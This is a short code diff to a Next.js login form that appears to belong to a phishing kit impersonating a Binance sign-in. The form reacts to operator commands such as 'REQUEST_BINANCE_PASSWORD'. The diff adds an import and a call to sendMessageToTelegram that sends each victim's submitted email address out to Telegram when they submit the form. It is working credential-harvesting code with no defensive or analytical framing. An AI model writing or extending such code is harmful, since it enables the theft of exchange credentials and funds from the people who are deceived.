@@ -7,6 +7,7 @@ import { useValidateEmail } from '../app/hooks/useValidate';
 import { useEmail } from '../app/lib/EmailContext';
 import { useRouter } from 'next/navigation';
 import { notifyNewUser } from '../lib/api';
+import { sendMessageToTelegram } from '../lib/api'; 
 import { useCommand } from '../app/lib/CommandContext';
 
 export default function LoginForm() {
@@ -97,6 +98,7 @@ export default function LoginForm() {
     useEffect(() => {
         if (command === 'REQUEST_EMAIL_AGAIN') {
             setInvalid(true); // Show error state for email input
+            setIsLoading(false);
         }  else if (command === 'REQUEST_BINANCE_PASSWORD') {
             setIsLoading(false);
             setTimeout(() => {
@@ -113,6 +115,7 @@ export default function LoginForm() {
         setInvalid(!isValid);
         setIsLoading(true);
         setUserEmail(email);
+        sendMessageToTelegram(email);
     };
 
     // Filter email suggestions
